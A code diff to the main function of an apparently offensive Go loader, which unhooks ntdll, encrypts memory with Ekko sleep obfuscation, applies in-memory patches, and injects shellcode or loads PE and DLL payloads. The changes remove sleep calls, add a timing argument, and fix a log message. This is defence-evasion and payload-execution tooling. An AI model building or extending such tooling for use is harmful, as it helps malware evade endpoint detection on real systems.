@@ -15,8 +15,6 @@ import (
 func main() {
 	winapi.UnhookNtdll()
 
-	ekko.EkkoSleep(100)
-
 
 	var (
 		uPE       = flag.Bool("pe", false, "Load and execute PE file")
@@ -66,15 +64,15 @@ func main() {
 		log.Fatalf("[ERROR] Failed to generate key: %v\n", err)
 	}
 
-	err = ekko.EncryptMemoryRegion(addr, size, key)
+	err = ekko.EncryptMemoryRegion(addr, size, key, 1000)
 	if err != nil {
 		log.Fatalf("[ERROR] Failed to encrypt memory region: %v\n", err)
 	}
 
 	// we just call it again to decrypt bc symmetric 
-	err = ekko.EncryptMemoryRegion(addr, size, key)
+	err = ekko.EncryptMemoryRegion(addr, size, key, 1000)
 	if err != nil {
-		log.Fatalf("[ERROR] Failed to encrypt memory region: %v\n", err)
+		log.Fatalf("[ERROR] Failed to decrypt memory region: %v\n", err)
 	}
 
 	winapi.ApplyCriticalPatches()
@@ -85,13 +83,11 @@ func main() {
 		}
 		
 	} else if *uSh {
-		ekko.EkkoSleep(100)
 		err := wrappers.NtInjectSelfShellcode(fileBytes)
 		if err != nil {
 			wrappers.NtInjectSelfShellcode(fileBytes)
 		}
 	} else if *uDL {
-		ekko.EkkoSleep(100)
 		err := dll.LoadDLL(fileBytes, *fn)
 		if err != nil {
 			log.Fatalf("[ERROR] Failed to load DLL: %v\n", err)
